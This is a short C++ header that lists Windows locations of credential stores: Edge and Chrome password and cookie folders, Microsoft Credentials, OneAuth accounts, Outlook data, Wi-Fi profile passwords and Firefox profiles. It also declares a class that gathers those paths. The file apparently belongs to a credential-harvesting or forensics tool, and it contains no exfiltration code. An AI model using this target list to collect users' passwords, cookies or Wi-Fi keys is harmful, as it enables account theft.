#ifndef GET_DIRECTORY_H
#define GET_DIRECTORY_H

#include "../include/lib.h"
#include <vector>

namespace fp
{
    // Under Profile
    static const std::string COOKIES = "Cookies";

    // Under Local AppData
    static const std::string M_CRED = "Microsoft\\Credentials";
    static const std::string PASSWORD_EDGE = "Microsoft\\Edge\\User Data\\Default";
    static const std::string COOKIE_EDGE = "Microsoft\\Edge\\User Data\\Default\\Network";
    static const std::string ONE_AUTH = "Microsoft\\OneAuth\\accounts";
    static const std::string OUTLOOK_EMAIL = "Microsoft\\Outlook";

    static const std::string PASSWORD_CHROME = "Google\\Chrome\\User Data\\Default";
    static const std::string COOKIE_CHROME = "Google\\Chrome\\User Data\\Default\\Network";

    // Under ProgramData
    static const std::string PASSWORD_WIFI = "Microsoft\\Wlansvc\\Profiles\\Interfaces";

    // Under Roaming AppData
    static const std::string FIREFOX = "Mozilla\\Firefox\\Profiles";

    bool check_path(std::filesystem::path cpath);
    class dir {
        public:
            dir() = default;
            ~dir() = default;
            std::vector<std::filesystem::path> pVec;
            void add_paths(std::filesystem::path apath);
            void get_directory();
    };
}

#endif // GET_DIRECTORY_H